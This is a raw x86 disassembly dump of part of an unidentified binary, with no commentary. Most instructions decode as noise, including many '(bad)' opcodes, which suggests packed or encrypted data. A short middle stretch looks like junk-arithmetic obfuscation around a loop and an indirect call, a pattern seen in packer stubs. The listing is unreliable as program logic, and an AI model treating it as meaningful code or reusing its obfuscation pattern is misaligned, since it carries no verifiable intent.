  40da9c:	sub    cl,dl
  40da9e:	xchg   ecx,eax
  40da9f:	and    eax,0x17456eb7
  40daa4:	rol    BYTE PTR [ecx],1
  40daa6:	dec    edx
  40daa7:	and    DWORD PTR [esi-0x4c],ebx
  40daaa:	gs adc edx,edi
  40daad:	xchg   edx,eax
  40daae:	retf   0x8385
  40dab1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dab2:	jo     0x40da3e
  40dab4:	push   cs
  40dab5:	ins    BYTE PTR es:[edi],dx
  40dab6:	dec    esi
  40dab7:	jne    0x40daf3
  40dab9:	dec    edi
  40daba:	shl    BYTE PTR [eax],0x1
  40dabd:	popf   
  40dabe:	in     eax,dx
  40dabf:	loop   0x40daf3
  40dac1:	(bad)  
  40dac3:	stos   DWORD PTR es:[edi],eax
  40dac4:	enter  0x478b,0x44
  40dac8:	in     eax,0xad
  40daca:	dec    eax
  40dacb:	lahf   
  40dacc:	pusha  
  40dacd:	push   ecx
  40dace:	aad    0x9b
  40dad0:	add    DWORD PTR [eax],edx
  40dad2:	xlat   BYTE PTR ds:[ebx]
  40dad3:	fldcw  WORD PTR [esi]
  40dad5:	out    dx,al
  40dad6:	je     0x40db0b
  40dad8:	cmp    ch,BYTE PTR [edx-0x7a1590d3]
  40dade:	inc    edi
  40dadf:	pop    es
  40dae0:	(bad)  
  40dae1:	mov    dl,0x75
  40dae3:	repnz sub al,bl
  40dae6:	xchg   BYTE PTR [esi+0x551175f5],ah
  40daec:	fst    st(2)
  40daee:	into   
  40daef:	arpl   WORD PTR [ebx+0x66462a31],bp
  40daf5:	fs mov al,0x4d
  40daf8:	sbb    DWORD PTR [ecx+0x50],esi
  40dafb:	ins    BYTE PTR es:[edi],dx
  40dafc:	and    al,0x9c
  40dafe:	xor    bh,ah
  40db00:	pop    ss
  40db01:	push   ds
  40db02:	and    eax,0xe42507da
  40db07:	and    BYTE PTR [edi+0xe],bl
  40db0a:	pop    es
  40db0b:	inc    ebx
  40db0c:	sbb    bh,ch
  40db0e:	and    al,0x39
  40db10:	push   ebx
  40db11:	pop    ebx
  40db12:	(bad)  
  40db13:	cld    
  40db14:	xchg   ch,dl
  40db16:	sub    bh,BYTE PTR [edx+0x71]
  40db19:	push   eax
  40db1a:	int    0xcd
  40db1c:	into   
  40db1d:	fisttp DWORD PTR [esi-0x7baf2ee8]
  40db23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db24:	nop
  40db25:	enter  0x267a,0x88
  40db29:	jmp    0x40db49
  40db2b:	(bad)  
  40db2d:	xor    eax,0x4a93bef2
  40db32:	push   esp
  40db33:	mov    eax,0xde4008a1
  40db38:	mov    bl,0xf2
  40db3a:	xchg   edx,eax
  40db3b:	js     0x40db0f
  40db3d:	xlat   BYTE PTR ds:[ebx]
  40db3e:	dec    esp
  40db3f:	cmp    DWORD PTR [ecx-0x7],edx
  40db42:	xchg   esi,eax
  40db43:	sbb    DWORD PTR [esi-0x6b],esi
  40db46:	push   esi
  40db47:	in     al,dx
  40db48:	inc    ebx
  40db49:	iret   
  40db4a:	fmul   st(6),st
  40db4c:	push   DWORD PTR [ebx+edi*1-0x53e6fac0]
  40db53:	sub    DWORD PTR [ecx-0x135592b8],ecx
  40db59:	(bad)  
  40db5a:	call   DWORD PTR [edi+0x77]
  40db5d:	inc    ebp
  40db5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db5f:	mov    fs:0x4c6be817,al
  40db65:	std    
  40db66:	lods   al,BYTE PTR ds:[esi]
  40db67:	inc    DWORD PTR [ecx+0x7b]
  40db6a:	not    BYTE PTR [ebp+0x9]
  40db6d:	cli    
  40db6e:	mov    dl,0x91
  40db70:	mov    cl,0xc6
  40db72:	add    ecx,DWORD PTR [ecx-0x53]
  40db75:	xchg   DWORD PTR [esi],eax
  40db77:	mov    al,0x59
  40db79:	outs   dx,BYTE PTR ds:[esi]
  40db7a:	out    dx,al
  40db7b:	add    DWORD PTR [ebp+0x3d],esi
  40db7e:	jmp    DWORD PTR [edx-0x484e85ce]
  40db84:	imul   esp,DWORD PTR [ebp+0x76c4f3e2],0xf59878a
  40db8e:	loope  0x40db71
  40db90:	lods   eax,DWORD PTR ds:[esi]
  40db91:	mov    ebp,0xdbae4672
  40db96:	xchg   BYTE PTR [edi+0x51c9befe],ch
  40db9c:	xchg   esi,eax
  40db9d:	adc    al,0xb7
  40db9f:	popf   
  40dba0:	pop    ebx
  40dba1:	xchg   al,ah
  40dba3:	out    dx,eax
  40dba4:	arpl   di,di
  40dba6:	dec    ecx
  40dba7:	aam    0x1e
  40dba9:	sub    dl,BYTE PTR [ebp-0x3e]
  40dbac:	int3   
  40dbad:	ret    0xb6c0
  40dbb0:	inc    esi
  40dbb1:	mov    ebp,0xf1785d03
  40dbb6:	in     al,0x95
  40dbb8:	jno    0x40db95
  40dbba:	xchg   edi,eax
  40dbbb:	jae    0x40db9f
  40dbbd:	shl    BYTE PTR [ecx+eiz*1+0x11],0x1
  40dbc2:	loope  0x40dbb2
  40dbc4:	(bad)  
  40dbc5:	jb     0x40dc2f
  40dbc7:	fwait
  40dbc8:	jnp    0x40db93
  40dbca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbcb:	jnp    0x40dc25
  40dbcd:	cwde   
  40dbce:	fadd   DWORD PTR [ecx+0x7ed264f7]
  40dbd4:	cs mov cl,0xf4
  40dbd7:	jbe    0x40dc1d
  40dbd9:	cld    
  40dbda:	fwait
  40dbdb:	xor    DWORD PTR ds:0x3ecd24dc,eax
  40dbe1:	inc    esp
  40dbe2:	xor    bl,0xbc
  40dbe5:	pusha  
  40dbe6:	sub    eax,0xd3b688d2
  40dbeb:	dec    ebx
  40dbec:	jo     0x40dba3
  40dbee:	call   0x68eb:0xbc832c33
  40dbf5:	cmp    esp,DWORD PTR [ebp+0xef4cfc0]
  40dbfb:	mov    esi,0x4f8f7e9f
  40dc00:	adc    ecx,DWORD PTR [edx]
  40dc02:	loope  0x40dc32
  40dc04:	push   esp
  40dc05:	and    BYTE PTR [ebp-0x1153d3ca],cl
  40dc0b:	pop    esp
  40dc0c:	add    ebp,edi
  40dc0e:	stc    
  40dc0f:	mov    edi,0x127ef52a
  40dc14:	xor    ch,cl
  40dc16:	sbb    al,0xaa
  40dc18:	loopne 0x40dbf6
  40dc1a:	jae    0x40dc7d
  40dc1c:	push   eax
  40dc1d:	and    DWORD PTR [eax+0x33],edi
  40dc20:	mov    bl,dl
  40dc22:	fdiv   DWORD PTR [eax]
  40dc24:	mov    cl,0xd7
  40dc26:	loope  0x40dc2d
  40dc28:	cmp    BYTE PTR [esp+edi*4+0x3e],cl
  40dc2c:	mov    al,ds:0xed4cc8f1
  40dc31:	jle    0x40dc3c
  40dc33:	call   0x3c7:0x152bcd89
  40dc3a:	jle    0x40dc4a
  40dc3c:	jmp    0x40dc0c
  40dc3e:	jmp    0x98035a70
  40dc43:	inc    esp
  40dc44:	jmp    DWORD PTR [eax-0x74]
  40dc47:	add    esp,DWORD PTR [edx+0x17a1852]
  40dc4d:	or     dl,BYTE PTR [ecx+eiz*1]
  40dc50:	sub    al,0xf7
  40dc52:	ins    BYTE PTR es:[edi],dx
  40dc53:	adc    edx,eax
  40dc55:	and    bl,dl
  40dc57:	mov    ebp,0xc9b22679
  40dc5c:	scas   eax,DWORD PTR es:[edi]
  40dc5d:	push   ecx
  40dc5e:	cli    
  40dc5f:	das    
  40dc60:	es xchg edi,eax
  40dc62:	jl     0x40dc4f
  40dc64:	or     eax,0xb5abcf51
  40dc69:	sub    DWORD PTR [ecx-0x5e],ecx
  40dc6c:	pop    es
  40dc6d:	xor    eax,0x71d16149
  40dc72:	mov    edx,0x3f007c02
  40dc77:	outs   dx,BYTE PTR ds:[esi]
  40dc78:	shl    BYTE PTR [esi+0x6b],0xaa
  40dc7c:	aaa    
  40dc7d:	xor    eax,0x7d9e37ca
  40dc82:	fadd   st(3),st
  40dc84:	sbb    ebx,esp
  40dc86:	fist   WORD PTR [ebx]
  40dc88:	sbb    al,BYTE PTR [esi+0x5b88869e]
  40dc8e:	ret    
  40dc8f:	inc    ecx
  40dc90:	sub    bl,BYTE PTR [edi-0x3f]
  40dc93:	cs ins DWORD PTR es:[edi],dx
  40dc95:	(bad)
  40dc98:	or     BYTE PTR [esi],bl
  40dc9a:	xchg   edi,ecx
  40dc9c:	imul   BYTE PTR [esp+ebx*8]
  40dc9f:	aam    0x28
  40dca1:	xchg   ecx,eax
  40dca2:	fs add eax,0x4fd6a0a4
  40dca8:	xlat   BYTE PTR ds:[ebx]
  40dca9:	stos   DWORD PTR es:[edi],eax
  40dcaa:	and    al,0x3
  40dcac:	call   0x3154:0xdc31d6bc
  40dcb3:	jmp    0x136626f6
  40dcb8:	sub    al,0xc8
  40dcba:	inc    ebx
  40dcbb:	push   edx
  40dcbc:	je     0x40dcdc
  40dcbe:	lds    esi,FWORD PTR [edi+0x6f]
  40dcc1:	popa   
  40dcc2:	out    dx,eax
  40dcc3:	(bad)  
  40dcc4:	pop    ecx
  40dcc5:	push   edi
  40dcc6:	shr    bh,1
  40dcc8:	xchg   edx,eax
  40dcc9:	imul   DWORD PTR [edx-0x13]
  40dccc:	dec    eax
  40dccd:	(bad)  
  40dcce:	push   ds
  40dccf:	cld    
  40dcd0:	lock xor edx,DWORD PTR [ebp+0x46]
  40dcd4:	cld    
  40dcd5:	or     al,bh
  40dcd7:	push   ecx
  40dcd8:	lds    ecx,FWORD PTR [ecx+0x2bd01a09]
  40dcde:	push   0x40
  40dce0:	xchg   edi,eax
  40dce1:	arpl   WORD PTR [edi-0x34],sp
  40dce4:	data16 (bad) 
  40dce6:	int    0x79
  40dce8:	add    edx,ebp
  40dcea:	lds    ecx,FWORD PTR [esp+edi*2+0x0]
  40dcee:	mov    ch,0xd6
  40dcf0:	scas   al,BYTE PTR es:[edi]
  40dcf1:	xor    eax,0xbb3e4b45
  40dcf6:	daa    
  40dcf7:	inc    eax
  40dcf8:	fnsave [esi-0xe9deb11]
  40dcfe:	sbb    edi,DWORD PTR [ebp-0x6c]
  40dd01:	mov    al,ds:0x421ff109
  40dd06:	dec    esi
  40dd07:	mov    BYTE PTR [edx],al
  40dd09:	push   edi
  40dd0a:	repnz inc DWORD PTR [ecx]
  40dd0d:	add    al,0x4f
  40dd0f:	adc    eax,0x653710e6
  40dd14:	test   al,0xf1
  40dd16:	cli    
  40dd17:	mov    ebp,0x31bc7b9f
  40dd1c:	scas   al,BYTE PTR es:[edi]
  40dd1d:	inc    edx
  40dd1e:	(bad)  
  40dd1f:	std    
  40dd20:	and    eax,0x36b43401
  40dd25:	and    bh,BYTE PTR [edi+0x26]
  40dd28:	push   ebx
  40dd29:	sbb    al,0x63
  40dd2b:	sbb    BYTE PTR [esi],bh
  40dd2d:	int3   
  40dd2e:	or     DWORD PTR [edi],0x64389a8c
  40dd34:	outs   dx,BYTE PTR ds:[esi]
  40dd35:	and    al,0x85
  40dd37:	sbb    DWORD PTR [ecx-0x16960208],esp
  40dd3d:	(bad)  
  40dd3e:	dec    eax
  40dd3f:	fsubr  DWORD PTR [eax]
  40dd41:	(bad)  
  40dd42:	test   al,0x7a
  40dd44:	adc    BYTE PTR [eax+0x45],bl
  40dd47:	xchg   esi,eax
  40dd48:	sahf   
  40dd49:	cmp    al,0xc8
  40dd4b:	pop    edi
  40dd4c:	push   0x6e34751
  40dd51:	cmp    eax,0xc1e8f9c0
  40dd56:	sub    cl,BYTE PTR [ebp+0x12]
  40dd59:	sbb    esi,ecx
  40dd5b:	xchg   DWORD PTR [ecx],edx
  40dd5d:	mov    ah,0x77
  40dd5f:	push   ebx
  40dd60:	sti    
  40dd61:	int3   
  40dd62:	inc    edx
  40dd63:	pop    esi
  40dd64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd65:	in     al,dx
  40dd66:	jge    0x40dd49
  40dd68:	mov    edx,0xaab84078
  40dd6d:	in     eax,0xd6
  40dd6f:	add    eax,0x656720ae
  40dd74:	pop    ss
  40dd75:	xor    al,0xb2
  40dd77:	cmp    edi,DWORD PTR [edx-0x5368d045]
  40dd7d:	cmc    
  40dd7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd7f:	add    DWORD PTR [esi-0x5a0d9cc1],eax
  40dd85:	pop    ebx
  40dd86:	push   esi
  40dd87:	out    0xcf,al
  40dd89:	push   ss
  40dd8a:	clc    
  40dd8b:	or     eax,0x72982041
  40dd90:	dec    eax
  40dd91:	retf   
  40dd92:	mov    eax,0x17b0e253
  40dd97:	or     edx,ecx
  40dd99:	test   BYTE PTR [ecx+eax*1+0x649e29d3],dl
  40dda0:	pusha  
  40dda1:	mov    cl,0xc6
  40dda3:	inc    esi
  40dda4:	xchg   esi,eax
  40dda5:	(bad)  
  40dda6:	adc    DWORD PTR [ebx],0x39
  40dda9:	jl     0x40dde4
  40ddab:	or     eax,0x41f73a2
  40ddb0:	ror    BYTE PTR [edx+eax*4-0x56],1
  40ddb4:	out    dx,al
  40ddb5:	inc    esi
  40ddb6:	xchg   esi,eax
  40ddb7:	loop   0x40dda3
  40ddb9:	push   0x1d
  40ddbb:	test   DWORD PTR [di-0x29],ebp
  40ddbf:	mov    bh,0x51
  40ddc1:	jmp    0x6601:0x3a9ed8bb
  40ddc8:	push   edx
  40ddc9:	pop    esi
  40ddca:	mov    ebx,DWORD PTR [ebx+0x7a39c524]
  40ddd0:	sub    BYTE PTR ds:0x10165076,0x96
  40ddd7:	mov    bl,al
  40ddd9:	test   DWORD PTR [edx+0x367512fc],0x6b0875f1
  40dde3:	pushf  
  40dde4:	cld    
  40dde5:	sub    bh,BYTE PTR [edi+ebp*2-0x17c8aa3f]
  40ddec:	mov    WORD PTR [esi-0x73],ss
  40ddef:	retf   0xb54a
  40ddf2:	mov    ecx,DWORD PTR [esi-0x48]
  40ddf5:	mov    edx,0xa78303de
  40ddfa:	fst    QWORD PTR [edi]
  40ddfc:	cmp    al,0x95
  40ddfe:	push   0xffffff8b
  40de00:	ret    
  40de01:	adc    DWORD PTR [esi-0xb],ebp
  40de04:	addr16 in eax,dx
  40de06:	fidivr DWORD PTR [edx+esi*1+0xf]
  40de0a:	pop    ds
  40de0b:	mov    dl,0x9c
  40de0d:	(bad)  
  40de0e:	sub    al,0xc
  40de10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de11:	in     al,0xc2
  40de13:	ror    BYTE PTR [eax-0x162accdc],1
  40de19:	pop    esi
  40de1a:	mov    ebp,0x3ad35c1c
  40de1f:	and    al,BYTE PTR [eax-0x733c5107]
  40de25:	seta   dh
  40de28:	jns    0x40de3a
  40de2a:	enter  0x2063,0xf3
  40de2e:	nop
  40de2f:	mov    dl,0x73
  40de31:	repz iret 
  40de33:	cld    
  40de34:	ja     0x40de47
  40de36:	pop    ecx
  40de37:	imul   eax,eax,0x26
  40de3a:	ret    0x87f1
  40de3d:	into   
  40de3e:	aaa    
  40de3f:	jg     0x40de44
  40de41:	(bad)  
  40de42:	dec    ebx
  40de43:	dec    edi
  40de44:	stc    
  40de45:	push   ecx
  40de46:	pop    ss
  40de47:	fistp  WORD PTR [eax-0x3c]
  40de4a:	xor    eax,0x191628f3
  40de4f:	jmp    0x40dddc
  40de51:	inc    ebp
  40de52:	cld    
  40de53:	push   ebx
  40de54:	mov    DWORD PTR ds:0x42500c,0x32d4
  40de5e:	je     0x40deb5
  40de64:	or     DWORD PTR ds:0x427000,ecx
  40de6a:	mov    esi,DWORD PTR [ebp-0x18]
  40de6d:	mov    DWORD PTR ds:0x429000,0x1a4f
  40de77:	add    DWORD PTR [eax],esi
  40de79:	mov    eax,DWORD PTR [ebp-0x4]
  40de7c:	xor    esi,esi
  40de7e:	or     esi,DWORD PTR ds:0x428010
  40de84:	or     DWORD PTR ds:0x42600c,esi
  40de8a:	mov    esi,DWORD PTR [ebp+0xc]
  40de8d:	dec    DWORD PTR ds:0x428014
  40de93:	xor    esi,ecx
  40de95:	add    esi,edx
  40de97:	sub    DWORD PTR ds:0x426014,0x425028
  40dea1:	imul   esi,DWORD PTR [eax]
  40dea4:	mov    DWORD PTR ds:0x42701c,0x7c46
  40deae:	mov    DWORD PTR [eax],esi
  40deb0:	jmp    0x40dec4
  40deb5:	sub    DWORD PTR ds:0x427010,0x59d5
  40debf:	mov    esi,DWORD PTR [ebp+0x14]
  40dec2:	xor    DWORD PTR [eax],esi
  40dec4:	sub    esi,edi
  40dec6:	mov    eax,DWORD PTR [ebp-0x4]
  40dec9:	and    DWORD PTR ds:0x42801c,0x11ac
  40ded3:	mov    edi,DWORD PTR [ebp+0x10]
  40ded6:	add    ebx,esi
  40ded8:	xor    edi,ecx
  40deda:	or     DWORD PTR ds:0x429010,ebx
  40dee0:	mov    esi,0xffcd8d25
  40dee5:	dec    DWORD PTR ds:0x42801c
  40deeb:	mov    ebx,esi
  40deed:	sub    ebx,edi
  40deef:	add    DWORD PTR [eax],ebx
  40def1:	mov    DWORD PTR ds:0x425020,0x1c
  40defb:	cmp    DWORD PTR ds:0x425020,0x0
  40df02:	je     0x40df56
  40df08:	cmp    DWORD PTR ds:0x425020,0x9
  40df0f:	jne    0x40df28
  40df15:	push   DWORD PTR [ebp-0x28]
  40df18:	push   0x8d04
  40df1d:	push   0x4e0d
  40df22:	call   DWORD PTR ds:0x421020
  40df28:	cmp    DWORD PTR ds:0x425020,0xa
  40df2f:	jne    0x40df42
  40df35:	mov    edi,DWORD PTR ds:0x425020
  40df3b:	dec    edi
  40df3c:	mov    DWORD PTR ds:0x425020,edi
  40df42:	xor    edi,edi
  40df44:	xor    edi,DWORD PTR ds:0x425020
  40df4a:	dec    edi
  40df4b:	mov    DWORD PTR ds:0x425020,edi
  40df51:	jmp    0x40defb
  40df56:	mov    eax,DWORD PTR [ebp-0x4]
  40df59:	mov    edi,DWORD PTR [ebp-0x8]
  40df5c:	add    edi,DWORD PTR [eax]
  40df5e:	mov    DWORD PTR [ebp-0x8],edi
  40df61:	mov    eax,DWORD PTR [ebp+0xc]
  40df64:	mov    edi,DWORD PTR [ebp+0xc]
  40df67:	xor    edi,ecx
  40df69:	xor    eax,ecx
  40df6b:	lea    eax,[eax+edi*1+0x64e5b6]
  40df72:	mov    edi,DWORD PTR [ebp+0xc]
  40df75:	xor    edi,ecx
  40df77:	add    edi,edx
  40df79:	imul   eax,edi
  40df7c:	mov    edi,DWORD PTR [ebp+0xc]
  40df7f:	xor    edi,ecx
  40df81:	sub    edi,eax
  40df83:	mov    eax,DWORD PTR [ebp-0x4]
  40df86:	add    edi,edx
  40df88:	cmp    DWORD PTR [eax],edi
  40df8a:	mov    eax,DWORD PTR [ebp-0x4]
  40df8d:	mov    edi,DWORD PTR [ebp+0x10]
  40df90:	jg     0x40dfa3
  40df96:	xor    edi,ecx
  40df98:	mov    ebx,esi
  40df9a:	sub    ebx,edi
  40df9c:	add    DWORD PTR [eax],ebx
  40df9e:	jmp    0x40dfa9
  40dfa3:	xor    edi,ecx
  40dfa5:	add    edi,edx
  40dfa7:	add    DWORD PTR [eax],edi
  40dfa9:	mov    eax,DWORD PTR [ebp-0x8]
  40dfac:	mov    edi,DWORD PTR [ebp-0x10]
  40dfaf:	mov    eax,DWORD PTR [eax]
  40dfb1:	xor    edi,ecx
  40dfb3:	add    edi,0x3272da
  40dfb9:	not    edi
  40dfbb:	and    eax,edi
  40dfbd:	movsx  di,BYTE PTR [eax+0x1]
  40dfc2:	jmp    0x41036d
  40dfc7:	jge    0x40e029
  40dfc9:	xor    al,0x4e
  40dfcb:	xor    eax,DWORD PTR [esi]
  40dfcd:	add    ecx,DWORD PTR [edi-0x5e]
  40dfd0:	mov    dl,0x21
  40dfd2:	mov    al,0xcf
  40dfd4:	jge    0x40e01b
  40dfd6:	jne    0x40df9d
  40dfd8:	shl    BYTE PTR [edx+0x62],cl
  40dfdb:	hlt    
  40dfdc:	pop    edi
  40dfdd:	bound  esp,QWORD PTR [edx+0x11]
  40dfe0:	shl    bl,1
  40dfe2:	iret   
  40dfe3:	xor    DWORD PTR [esp+ecx*2-0x8],0xffffffe9
  40dfe8:	test   DWORD PTR [edx+0x68],ecx
  40dfeb:	push   ebp
  40dfec:	xor    BYTE PTR [edx+0x61df1559],dh
  40dff2:	and    BYTE PTR [di],0x32
  40dff6:	push   cs
  40dff7:	push   edi
  40dff8:	ins    DWORD PTR es:[edi],dx
  40dff9:	in     al,0x90
  40dffb:	cs fs sub al,0xb3
  40dfff:	fxch   st(1)
  40e001:	(bad)  
  40e002:	(bad)  
  40e003:	int    0xf5
  40e005:	aas    
  40e006:	data16 lahf 
  40e008:	push   ss
  40e009:	adc    esi,ecx
  40e00b:	lods   al,BYTE PTR ds:[esi]
  40e00c:	mov    ebx,0x93f81486
  40e011:	pop    edx
  40e012:	pop    edx
  40e013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e014:	inc    edx
  40e015:	adc    ch,0xa1
  40e018:	lock sbb al,BYTE PTR [ebp-0x5b29e625]
  40e01f:	sbb    al,0xd5
  40e021:	jnp    0x40e026
  40e023:	cmp    al,0x19
  40e025:	and    ebp,ebp
  40e027:	inc    edx
  40e028:	les    esi,FWORD PTR [edx+0x3295d8f6]
  40e02e:	fiadd  DWORD PTR [eax+0x1e85d5dc]
  40e034:	cmp    al,0x5f
  40e036:	into   
  40e037:	pop    ss
  40e038:	and    dl,ch
  40e03a:	mov    eax,0xf4a432ec
  40e03f:	and    al,0xc4
  40e041:	ret    
  40e042:	aam    0xdf
  40e044:	neg    BYTE PTR [ebx-0x9750b10]
  40e04a:	cwde   
  40e04b:	aad    0xb0
  40e04d:	xchg   bh,al
  40e04f:	sub    ah,BYTE PTR [ecx]
  40e051:	pop    eax
  40e052:	popa   
  40e053:	mov    esi,0x4c07407a
  40e058:	and    ah,BYTE PTR [ebp-0x1d]
  40e05b:	aas    
  40e05c:	lea    edx,[edx-0x327e0a50]
  40e062:	dec    esp
  40e063:	aam    0xf5
  40e065:	fcom   QWORD PTR [eax+0x5e]
  40e068:	dec    ebx
  40e069:	rcr    DWORD PTR [edi],cl
  40e06b:	test   eax,0x8b459df2
  40e070:	enter  0xad41,0x8e
  40e074:	push   esp
  40e075:	jns    0x40e031
  40e077:	mov    edi,ebx
  40e079:	jae    0x40e006
  40e07b:	pop    es
  40e07c:	test   al,0xe9
  40e07e:	test   esp,0x726ae319
  40e084:	inc    ecx
  40e085:	xchg   eax,ecx
  40e087:	mov    edx,0x565501ca
  40e08c:	data16 mov ss,WORD PTR [edx+0x24]
  40e090:	lds    ecx,FWORD PTR [ebx+0x5b]
  40e093:	jne    0x40e113
  40e095:	cmp    DWORD PTR ds:[ecx+0x3b],0x59
  40e09a:	loope  0x40e0b1
  40e09c:	dec    ebp
  40e09d:	loop   0x40e02e
  40e09f:	xchg   esi,eax
  40e0a0:	jae    0x40e026
  40e0a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0a3:	pusha  
  40e0a4:	xor    bl,BYTE PTR [ecx]
  40e0a6:	cdq    
  40e0a7:	sti    
  40e0a8:	scas   al,BYTE PTR es:[edi]
  40e0a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0aa:	cli    
  40e0ab:	xchg   edx,eax
  40e0ac:	aam    0x1f
  40e0ae:	bound  edi,QWORD PTR [eax+0x72]
  40e0b1:	jge    0x40e05e
  40e0b3:	fsub   DWORD PTR [esi+0x6]
  40e0b6:	jno    0x40e0cb
  40e0b8:	es dec esi
  40e0ba:	mov    BYTE PTR [edx*8-0x3fad5867],dh
  40e0c1:	enter  0x6813,0xf1
  40e0c5:	lahf   
  40e0c6:	mov    al,0x93
  40e0c8:	imul   eax,edx,0x3689b836
  40e0ce:	test   DWORD PTR [ecx+0x77b72fa4],ecx
  40e0d4:	stos   DWORD PTR es:[edi],eax
  40e0d5:	loope  0x40e0d5
  40e0d7:	out    0x4b,al
  40e0d9:	mov    al,ds:0xc579df6f
  40e0de:	shl    BYTE PTR [eax+0x5e],1
  40e0e1:	repz pop ebx
  40e0e3:	outs   dx,BYTE PTR ds:[esi]
  40e0e4:	jg     0x40e146
  40e0e6:	dec    ebx
  40e0e7:	std    
  40e0e8:	sbb    bh,al
  40e0ea:	in     al,0x14
  40e0ec:	and    BYTE PTR [edx-0x7],ch
  40e0ef:	repz lahf 
  40e0f1:	out    dx,al
  40e0f2:	rol    BYTE PTR [eax],1
  40e0f4:	hlt    
  40e0f5:	jns    0x40e14d
  40e0f7:	bound  ebp,QWORD PTR [ecx+ebp*1]
  40e0fa:	cmp    eax,0x3bb73730
  40e0ff:	loope  0x40e124
  40e101:	test   DWORD PTR [eax-0x67],ecx
  40e104:	pop    edi
  40e105:	in     al,0x82
  40e107:	mov    edx,0xcb0a838c
  40e10c:	call   0x2818:0x58141f66
  40e113:	ds jns 0x40e09e
  40e116:	es mov dl,0xeb
  40e119:	or     eax,0x5bb719fd
  40e11e:	cmp    eax,0x498c4017
  40e123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e124:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e125:	xchg   ebp,eax
  40e126:	adc    al,0x1e
  40e128:	mov    dl,BYTE PTR [ebx+0x16]
  40e12b:	fadd   st(7),st
  40e12d:	rcl    BYTE PTR [edi+0x56],1
  40e130:	les    edi,FWORD PTR [ebx+0x239909f3]
  40e136:	push   0xf
  40e138:	dec    ebx
  40e139:	inc    esi
  40e13a:	or     bh,dl
  40e13c:	inc    bh
  40e13e:	nop
  40e13f:	jmp    0x40e146
  40e141:	add    dl,ch
  40e143:	mov    dh,0x41
  40e145:	inc    ebx
  40e146:	mov    BYTE PTR [ecx+eax*8+0x77b7a33b],ch
  40e14d:	xor    eax,0xce5b5844
  40e152:	fs pop edx
  40e154:	shr    BYTE PTR [esi+0x11f599ad],cl
  40e15a:	lods   eax,DWORD PTR ds:[esi]
  40e15b:	adc    ah,ch
  40e15d:	test   al,0xfa
  40e15f:	dec    edx
  40e160:	loopne 0x40e168
  40e162:	mov    cl,0xab
  40e164:	push   ss
  40e165:	nop    DWORD PTR [eax-0x46]
  40e169:	mov    edx,0x2009f2f3
  40e16e:	xchg   ebp,eax
  40e16f:	push   ds
  40e170:	cmp    BYTE PTR [esi-0xd],al
  40e173:	jmp    0x55a7d720
  40e178:	mov    edx,0xdd6e51e2
  40e17d:	rcr    DWORD PTR [esi+0xa5d21c0],1
  40e183:	xor    BYTE PTR [edi+0x4e],dh
  40e186:	inc    eax
  40e187:	pop    eax
  40e188:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e189:	mov    edx,0x2844dc76
  40e18e:	gs int3 
  40e190:	mov    WORD PTR [edi+0x8],ds
  40e193:	jns    0x40e162
  40e195:	test   eax,0x76677a33
  40e19a:	sub    BYTE PTR [edi],dl
  40e19c:	dec    BYTE PTR [edx*2-0x107c2fd]
  40e1a3:	sub    cl,BYTE PTR [ebp-0x3b235a22]
  40e1a9:	(bad)  
  40e1aa:	pop    esp
  40e1ab:	ins    DWORD PTR es:[edi],dx
  40e1ac:	sub    al,BYTE PTR [ebp+0x1100fb07]
  40e1b2:	jb     0x40e14f
  40e1b4:	inc    esi
  40e1b5:	mov    bl,0x4
  40e1b7:	in     eax,0xc8
  40e1b9:	push   ecx
  40e1ba:	sbb    ebx,DWORD PTR [eax]
  40e1bc:	xor    al,0x64
  40e1be:	dec    ebp
  40e1bf:	jg     0x40e1cc
  40e1c1:	jo     0x40e21f
  40e1c3:	in     eax,0xa7
  40e1c5:	ret    
  40e1c6:	or     edx,0xffffffeb
  40e1c9:	sbb    dh,BYTE PTR [eax]
  40e1cb:	mov    dh,0x54
  40e1cd:	xchg   al,bl
  40e1cf:	xchg   ebp,eax
  40e1d0:	jp     0x40e1f2
  40e1d2:	cmp    eax,0xaf49563
  40e1d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1d8:	inc    eax
  40e1d9:	lahf   
  40e1da:	mov    ah,0x37
  40e1dc:	add    dl,BYTE PTR ds:0xd505f112
  40e1e2:	nop
  40e1e3:	add    DWORD PTR [eax-0x8f0180c],edi
  40e1e9:	jle    0x40e269
  40e1eb:	lock or bh,0x19
  40e1ef:	arpl   bx,si
  40e1f1:	jmp    0x40e236
  40e1f3:	jae    0x40e218
  40e1f5:	lods   eax,DWORD PTR ds:[esi]
  40e1f6:	xchg   BYTE PTR [esi-0x5b],bl
  40e1f9:	popa   
  40e1fa:	adc    ecx,DWORD PTR [edi+0x5094929b]
  40e200:	dec    ebp
  40e201:	outs   dx,BYTE PTR ds:[esi]
  40e202:	mov    ebp,0xc21f3fdf
  40e207:	(bad)  
  40e208:	adc    ch,BYTE PTR ds:0xde01f96a
  40e20e:	sbb    al,BYTE PTR [edi]
  40e210:	jae    0x40e1eb
  40e212:	sti    
  40e213:	rol    ebp,cl
  40e215:	xchg   ebx,eax
  40e216:	out    dx,al
  40e217:	scas   al,BYTE PTR es:[edi]
  40e218:	jne    0x40e227
  40e21a:	xacquire xchg BYTE PTR [edi],dh
  40e21d:	aas    
  40e21e:	xor    al,0xd2
  40e220:	mov    dl,0xed
  40e222:	xchg   edi,eax
  40e223:	push   edi
  40e224:	(bad)  
  40e225:	or     al,0x3
  40e227:	jmp    0x2411180
  40e22c:	call   0x676a:0x3f9de85
  40e233:	cmp    eax,0xc8eb1bf2
  40e238:	ins    BYTE PTR es:[edi],dx
  40e239:	shr    DWORD PTR [eax-0x63],1
  40e23c:	mov    bh,0x6a
  40e23e:	test   ebx,ebp
  40e240:	push   edx
  40e241:	vpmulhw ymm6,ymm0,YMMWORD PTR [ecx+0x54]
